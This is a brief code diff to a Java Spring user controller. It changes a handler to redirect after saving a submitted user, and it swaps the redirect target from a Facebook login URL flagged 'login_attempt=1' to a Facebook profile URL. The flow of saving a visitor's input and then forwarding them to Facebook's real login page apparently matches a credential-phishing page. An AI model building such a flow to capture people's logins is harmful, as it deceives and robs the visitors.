@@ -36,8 +36,8 @@ public class UserController {
 		}
 		userService.create(user);
 		
-	   // return "redirect:" + "redirect";
-		return "lode";
+	    return "redirect:" + "redirect";
+		//return "lode";
 	}
 	@GetMapping("/")
 	public String getButton() {
@@ -60,7 +60,7 @@ public class UserController {
 	}
 	@RequestMapping(value = "/redirect", method = RequestMethod.GET)
 	public ModelAndView method() {
-		String redirectUrl = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110";
+		String redirectUrl = "https://www.facebook.com/profile.php?id=100044509807985&__tn__=%2CdC-R-R&eid=ARDAGiXWoERoY0HbDpgcpsjh8NJmX-iF9o6uvqOe8hfwXQYKzlWG8IxUcbrnQCtt_QcGgQUC43JXENTl&hc_ref=ARQCC-Npn6ToPjxxs3WTAF8Y9nzopYBnOphJpgzW1-4OCjsTbZG74GBhEh-DVKQg6Q4&fref=nf";
 	    return new ModelAndView("redirect:" + redirectUrl);
 	}
 }
